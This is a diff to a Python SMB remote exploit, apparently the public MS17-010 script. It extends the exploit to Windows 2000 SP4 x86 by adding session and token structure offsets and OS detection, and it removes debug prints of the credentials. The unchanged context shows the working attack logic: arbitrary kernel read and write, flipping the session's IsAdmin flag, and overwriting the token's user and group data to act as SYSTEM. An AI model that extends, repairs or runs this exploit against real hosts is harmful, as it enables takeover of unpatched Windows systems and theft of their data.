@@ -29,6 +29,7 @@ Tested on:
 - Windows 2003 R2 SP2 x64
 - Windows XP SP2 x64
 - Windows XP SP3 x86
+- Windows 2000 SP4 x86
 
 '''
 '''
@@ -92,7 +93,7 @@ If we can overwrite Token to NULL and UsePsImpersonateClient to true, a running 
 to do all SMB operations.
 Note: fake Token might be possible, but NULL token is much easier.
 '''
-###########################
+##########################
 # info for modify session security context
 ###########################
 WIN7_64_SESSION_INFO = {
@@ -150,6 +151,14 @@ WINXP_32_SESSION_INFO = {
 	'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
 	'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
 	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
+}
+
+WIN2K_32_SESSION_INFO = {
+	'SESSION_ISNULL_OFFSET': 0x94,
+	'SESSION_SECCTX_OFFSET': 0x84,  # PCtxtHandle is at offset 0x80 but only upperPart is needed
+	'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
+	'TOKEN_USER_GROUP_CNT_OFFSET': 0x3c,
+	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x58,
 }
 
 ###########################
@@ -253,6 +262,9 @@ OS_ARCH_INFO = {
 		'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WIN2K3_32_SESSION_INFO),
 		'x64': merge_dicts(X64_INFO, WIN5_64_TRANS_INFO, WIN2K3_64_SESSION_INFO),
 	},
+	'WIN2K': {
+		'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WIN2K_32_SESSION_INFO),
+	},
 }
 
 
@@ -278,7 +290,7 @@ def find_named_pipe(conn):
 			fid = conn.nt_create_andx(tid, pipe)
 			conn.close(tid, fid)
 			found_pipe = pipe
-		except smb.SessionError, e:
+		except smb.SessionError as e:
 			pass
 
 	conn.disconnect_tree(tid)
@@ -756,8 +768,7 @@ def exploit(target, pipe_name, username, password, cmd):
 	conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 
 	info = {}
-	print username
-	print password
+
 	conn.login(username, password, maxBufferSize=4356)
 	server_os = conn.get_server_os()
 	print('Target OS: '+server_os)
@@ -772,29 +783,33 @@ def exploit(target, pipe_name, username, password, cmd):
 		info['method'] = exploit_fish_barrel
 	elif server_os.startswith("Windows Server 2003 "):
 		info['os'] = 'WIN2K3'
-		info['method'] = exploit_fish_barrel		
+		info['method'] = exploit_fish_barrel
 	elif server_os.startswith("Windows 5.1"):
 		info['os'] = 'WINXP'
 		info['arch'] = 'x86'
-		info['method'] = exploit_fish_barrel		
+		info['method'] = exploit_fish_barrel
 	elif server_os.startswith("Windows XP "):
 		info['os'] = 'WINXP'
 		info['arch'] = 'x64'
-		info['method'] = exploit_fish_barrel		
+		info['method'] = exploit_fish_barrel
+	elif server_os.startswith("Windows 5.0"):
+		info['os'] = 'WIN2K'
+		info['arch'] = 'x86'
+		info['method'] = exploit_fish_barrel
 	else:
 		print('This exploit does not support this target')
 		sys.exit()
-
+	
 	if pipe_name is None:
 		pipe_name = find_named_pipe(conn)
 		if pipe_name is None:
 			print('Not found accessible named pipe')
 			return False
 		print('Using named pipe: '+pipe_name)
-
+	
 	if not info['method'](conn, pipe_name, info):
 		return False
-
+	
 	# Now, read_data() and write_data() can be used for arbitrary read and write.
 	# ================================
 	# Modify this SMB session to be SYSTEM
@@ -802,15 +817,15 @@ def exploit(target, pipe_name, username, password, cmd):
 	# Note: Windows XP stores only PCtxtHandle and uses ImpersonateSecurityContext() for impersonation, so this
 	#         method does not work on Windows XP. But with arbitrary read/write, code execution is not difficult.
 	fmt = info['PTR_FMT']
-
+	
 	print('make this SMB session to be SYSTEM')
 	# IsNullSession = 0, IsAdmin = 1
 	write_data(conn, info, info['session']+info['SESSION_ISNULL_OFFSET'], '\x00\x01')
-
+	
 	# read session struct to get SecurityContext address
 	sessionData = read_data(conn, info, info['session'], 0x100)
 	secCtxAddr = unpack_from('<'+fmt, sessionData, info['SESSION_SECCTX_OFFSET'])[0]
-
+	
 	if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
 		# the target has only PCtxtHandle for impersonation (Windows 2003 and earlier)
 		# find the token and modify it
@@ -819,19 +834,19 @@ def exploit(target, pipe_name, username, password, cmd):
 			pctxtDataAddr = unpack_from('<'+fmt, pctxtDataInfo)[0]
 		else:
 			pctxtDataAddr = secCtxAddr
-
+	
 		tokenAddrInfo = read_data(conn, info, pctxtDataAddr+info['PCTXTHANDLE_TOKEN_OFFSET'], 8)
 		tokenAddr = unpack_from('<'+fmt, tokenAddrInfo)[0]
 		print('current TOKEN addr: 0x{:x}'.format(tokenAddr))
-
+		
 		# copy Token data for restoration
 		tokenData = read_data(conn, info, tokenAddr, 0x40*info['PTR_SIZE'])
-
+		
 		userAndGroupCount = unpack_from('<I', tokenData, info['TOKEN_USER_GROUP_CNT_OFFSET'])[0]
 		userAndGroupsAddr = unpack_from('<'+fmt, tokenData, info['TOKEN_USER_GROUP_ADDR_OFFSET'])[0]
 		print('userAndGroupCount: 0x{:x}'.format(userAndGroupCount))
 		print('userAndGroupsAddr: 0x{:x}'.format(userAndGroupsAddr))
-
+	
 		print('overwriting token UserAndGroups')
 		# modify UserAndGroups info
 		fakeUserAndGroupCount, fakeUserAndGroups = create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr)
@@ -842,10 +857,11 @@ def exploit(target, pipe_name, username, password, cmd):
 		# the target can use PsImperonateClient for impersonation (Windows 2008 and later)
 		# copy SecurityContext for restoration
 		secCtxData = read_data(conn, info, secCtxAddr, info['SECCTX_SIZE'])
-
+	
 		print('overwriting session security context')
 		# see FAKE_SECCTX detail at top of the file
 		write_data(conn, info, secCtxAddr, info['FAKE_SECCTX'])
+
 
 	# ================================
 	# do whatever we want as SYSTEM over this SMB connection
@@ -862,7 +878,7 @@ def exploit(target, pipe_name, username, password, cmd):
 			write_data(conn, info, tokenAddr+info['TOKEN_USER_GROUP_CNT_OFFSET'], pack('<I', userAndGroupCount))
 	else:
 		write_data(conn, info, secCtxAddr, secCtxData)
-
+	
 	conn.disconnect_tree(conn.get_tid())
 	conn.logoff()
 	conn.get_socket().close()
